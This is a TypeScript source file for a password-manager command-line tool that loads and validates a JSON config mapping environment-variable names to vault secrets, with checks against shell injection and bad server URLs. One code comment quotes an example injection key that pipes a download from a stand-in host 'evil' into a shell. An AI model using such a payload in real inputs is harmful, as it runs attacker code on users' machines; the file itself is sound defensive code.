/**
 * .passwd-sso-env.json loader.
 *
 * Schema:
 * {
 *   "apiKey?": "api_...",         // optional — uses /api/v1/ path
 *   "secrets": {
 *     "ENV_VAR_NAME": { "entry": "<entryId>", "field": "password" }
 *   }
 * }
 *
 * Auth flow:
 *   apiKey present → /api/v1/passwords (Bearer api_key)
 *   apiKey absent  → /api/passwords   (Bearer extension token via login)
 */

import { readFileSync, existsSync } from "node:fs";
import { resolve } from "node:path";
import { loadConfig } from "./config.js";
import { validateServerUrl } from "./oauth.js";

export interface SecretMapping {
  entry: string;
  field: string;
}

export interface SecretsConfig {
  apiKey?: string;
  secrets: Record<string, SecretMapping>;
}

function isPlaceholderEntryId(entryId: string): boolean {
  return entryId === "dummy-entry-id" || /^<[^>]+>$/.test(entryId);
}

// Config keys become env-var NAMES emitted as `export ${key}=...` / `${key}=...`
// by the `env` command, which is documented for `eval $(passwd-sso env)` and
// `source`. An unvalidated key is a shell-injection sink: a key like
// `SAFE; curl evil|sh #` would execute arbitrary commands when eval'd. Restrict
// keys to POSIX-portable env-var names — the character class excludes every
// shell metacharacter, so no injection payload can pass. JS `$` (no `m` flag)
// matches only end-of-input, so a trailing newline cannot slip through either.
const ENV_NAME_RE = /^[A-Za-z_][A-Za-z0-9_]*$/;
const MAX_ENV_NAME_LENGTH = 128;

function assertValidEnvName(envName: string): void {
  if (envName.length > MAX_ENV_NAME_LENGTH) {
    throw new Error(
      `Secret mapping key is too long (max ${MAX_ENV_NAME_LENGTH} characters).`,
    );
  }
  if (!ENV_NAME_RE.test(envName)) {
    // Do NOT echo the raw key — it may carry an injection payload.
    throw new Error(
      "Secret mapping key must be a valid environment variable name " +
        "(letters, digits, underscore; not starting with a digit).",
    );
  }
}

export function loadSecretsConfig(configPath?: string): SecretsConfig {
  const filePath = configPath
    ? resolve(configPath)
    : resolve(process.cwd(), ".passwd-sso-env.json");

  if (!existsSync(filePath)) {
    throw new Error(`Config file not found: ${filePath}`);
  }

  const raw = readFileSync(filePath, "utf-8");
  const parsed = JSON.parse(raw) as SecretsConfig;

  if (!parsed.secrets || typeof parsed.secrets !== "object") {
    throw new Error("Config file must have a 'secrets' field.");
  }

  for (const [envName, mapping] of Object.entries(parsed.secrets)) {
    assertValidEnvName(envName);
    if (!mapping || typeof mapping !== "object") {
      throw new Error(`Secret mapping for '${envName}' must be an object.`);
    }

    const rawMapping = mapping as Partial<SecretMapping>;
    if (typeof rawMapping.entry !== "string" || rawMapping.entry.trim().length === 0) {
      throw new Error(`Secret mapping for '${envName}' must have a non-empty 'entry' string.`);
    }
    if (typeof rawMapping.field !== "string" || rawMapping.field.trim().length === 0) {
      throw new Error(`Secret mapping for '${envName}' must have a non-empty 'field' string.`);
    }
    const entry = rawMapping.entry.trim();
    const field = rawMapping.field.trim();
    if (isPlaceholderEntryId(entry)) {
      throw new Error(
        `Secret mapping for '${envName}' uses placeholder entry ID "${entry}". Replace it with a real vault entry ID.`,
      );
    }
    // Preserve unknown keys (e.g. user-added comment fields) while normalising entry/field.
    parsed.secrets[envName] = { ...rawMapping, entry, field } as SecretMapping;
  }

  return parsed;
}

export function getSecretsServerUrl(): string {
  const { serverUrl } = loadConfig();
  if (!serverUrl) {
    throw new Error(
      "Server URL not configured. Run `passwd-sso login -s <server-url>` once to configure it.",
    );
  }
  // Defense-in-depth: re-validate the persisted URL before issuing a fetch
  // with a Bearer token. Login validates at write time, but a hand-edited
  // config file would otherwise reach fetch() unchecked.
  validateServerUrl(serverUrl);
  return serverUrl.replace(/\/$/, "");
}

/**
 * Returns the API path for fetching a single password entry.
 * If apiKey is configured, use the public /api/v1/ path.
 */
export function getPasswordPath(entryId: string, useV1: boolean): string {
  if (/[\/\\]/.test(entryId)) {
    throw new Error(`Invalid entry ID: "${entryId}"`);
  }
  return useV1
    ? `/api/v1/passwords/${encodeURIComponent(entryId)}`
    : `/api/passwords/${encodeURIComponent(entryId)}`;
}
